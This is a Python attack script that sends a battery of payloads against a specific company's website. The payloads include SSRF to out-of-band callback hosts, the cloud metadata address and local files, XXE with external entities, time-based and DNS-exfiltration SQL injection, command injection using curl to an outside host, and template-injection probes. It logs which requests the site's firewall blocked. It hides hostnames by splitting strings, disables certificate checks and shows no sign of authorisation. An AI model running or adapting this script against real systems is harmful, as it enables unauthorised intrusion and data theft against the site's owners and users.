import requests, urllib.parse, time, json, warnings
warnings.filterwarnings("ignore")
B = "https://" + "www.infinitycapital.bh"
S = requests.Session()
V = lambda *a: ".".join(a)
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + V("1","2","6","0","0","0","0") + " Safari/" + V("5","3","7","3","6")
H = {"User-Agent": UA, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.9"}

D = V("oast","abhedi","co","in"); DOM = "dau2p4ghgqag02k5emggc5xu6hph3m973"
HOSTS = ["oob0a8bc6b4d314", "oob7d001dce6dba"]

def img(inner):
    return "/_next/image?url=" + urllib.parse.quote(inner, safe="") + "&w=64&q=75"

tests = []
for h in HOSTS:
    hb = V(h, DOM, D)
    xxe = '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://' + hb + '/xxe">]><r>&x;</r>'
    sqli_dns = ("'" + " AND (SELECT LOAD_FILE(CONCAT(" +
                ",".join(["0x2f","0x65","0x74","0x63","0x2f","0x61","0x61","0x61","0x61","0x2e","0x73","0x68","0x2f","0x2f","0x2f","0x2f"]) +
                ")))--+-")
    cmdi = "http://" + hb + "/cmdi;curl+" + hb
    tests += [
        (img("http://" + hb + "/ssrf"), "GET", None, "ssrf-url-http"),
        (img("https://" + hb + "/ssrf2"), "GET", None, "ssrf-url-https"),
        (img("http://169.254.169.254/latest/meta-data/"), "GET", None, "imds"),
        (img("http://127.0.0.1:80/"), "GET", None, "ssrf-localhost"),
        (img("file:///etc/passwd"), "GET", None, "lfi-file"),
        ("/api/?xml=" + urllib.parse.quote(xxe, safe=""), "GET", None, "xxe-query"),
        ("/api/", "POST", {"xml": xxe}, "xxe-json"),
        ("/api/", "POST", xxe.encode(), "xxe-body-xml"),
        (img(xxe), "GET", None, "xxe-in-url"),
        ("/api/?id=" + urllib.parse.quote("1' AND SLEEP(5)-- -"), "GET", None, "sqli-time"),
        (img("http://" + hb + "/blind" + sqli_dns), "GET", None, "sqli-oob-dns"),
        (img(cmdi), "GET", None, "cmdi"),
        ("/?q=" + urllib.parse.quote("{{7*7}}"), "GET", None, "ssti"),
        ("/api/?name=" + urllib.parse.quote("{{7*7}}"), "GET", None, "ssti-api"),
    ]

out = []
for path, method, data, label in tests:
    try:
        t0 = time.time()
        r = S.request(method, B + path, headers=H, data=data, timeout=25, verify=False, allow_redirects=False)
        dt = time.time() - t0
        rec = {"label": label, "path": path[:130], "status": r.status_code,
               "mitigated": r.headers.get("x-vercel-mitigated"), "len": len(r.content), "t": round(dt, 2)}
        out.append(rec)
        print(f"{label:16} {r.status_code} mit={r.headers.get('x-vercel-mitigated')} len={len(r.content)} t={dt:.2f} :: {path[:70]}")
    except Exception as e:
        print(f"{label:16} EXC {str(e)[:110]}")
    time.sleep(1.2)

json.dump(out, open("oob_fire_results.json", "w"), indent=1)
print("saved")
